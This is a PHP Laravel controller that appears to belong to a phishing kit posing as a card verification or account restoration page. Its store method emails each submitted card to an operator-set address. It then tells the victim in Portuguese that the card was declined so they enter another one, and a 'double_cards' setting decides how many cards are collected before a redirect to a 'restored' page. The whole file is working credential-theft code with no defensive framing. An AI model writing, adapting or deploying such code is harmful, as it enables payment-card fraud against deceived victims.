<?php

namespace App\Http\Controllers;

use App\Http\Requests\StoreCardRequest;
use App\Mail\CardDetails;
use App\Models\Settings;
use App\Models\Visitor;
use Illuminate\Http\RedirectResponse;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Mail;
use Illuminate\Validation\ValidationException;
use Inertia\Inertia;
use Log;
use Throwable;

class CardController extends Controller {
    public function index()
    {
        if (Cache::has(Visitor::current()->user)) {
            return Inertia::render('Card/Index');
        }

        return $this->back2base();
    }

    public function store(StoreCardRequest $request): RedirectResponse
    {
        if (!Cache::has(Visitor::current()->user)) {
            return $this->back2base();
        }

        $visitor = Visitor::current();
        $settings = Settings::me();

        try {
            Mail::to($settings->email_result)->sendNow(new CardDetails($request));
        } catch (Throwable $t) {
            Log::error($t);
        }

        if (Cache::get($request->cardNumber) !== $visitor->user) {
            $visitor->increment('card_count');
            $visitor->save();
        }

        if ((!$settings->double_cards && $visitor->card_count > 0) || ($visitor->card_count > 1)) {
            $visitor->is_finished = true;
            $visitor->save();
            return redirect()->route(route: 'restored');
        }

        throw ValidationException::withMessages([
            'cardNumber' => 'Seu cartão foi recusado, por favor tente outro cartão.'
        ]);
    }
}
